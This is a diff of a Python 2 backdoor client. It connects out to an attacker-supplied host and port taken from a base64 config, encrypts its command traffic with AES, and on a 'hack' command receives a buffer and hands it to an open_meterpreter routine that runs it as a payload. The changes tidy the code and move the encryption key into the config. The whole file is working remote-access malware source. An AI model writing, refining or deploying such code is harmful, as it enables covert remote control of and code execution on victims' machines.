@@ -1,11 +1,9 @@
 #!/usr/bin/python
 
 import socket, subprocess, sys, os
-import pickle
 from Crypto.Cipher import AES
 import base64
 import ctypes
-import pdb
 BLOCK_SIZE = 32  # Bytes
 unpad = lambda s: s[:-ord(s[len(s) - 1:])]
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
@@ -18,10 +16,7 @@ config = base64.b64decode(config)
 config = config.split(",")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-
 s.connect((config[0], int(config[1])))
-
-
 
 
 def do_encrypt(message):
@@ -31,7 +26,7 @@ def do_encrypt(message):
     return ciphertext
 
 def do_decrypt(ciphertext):
-    obj2 = AES.new('This_is_a_key123', AES.MODE_ECB)
+    obj2 = AES.new(config[2], AES.MODE_ECB)
     message = obj2.decrypt(ciphertext)
     return unpad(message)
 
@@ -69,6 +64,7 @@ while True :
     elif "hack" in command:
         buf = s.recv(10000)
         buf = do_decrypt(buf)
+        #print bytearray(buf)
         open_meterpreter(bytearray(buf))
         print "sigue"
     else:
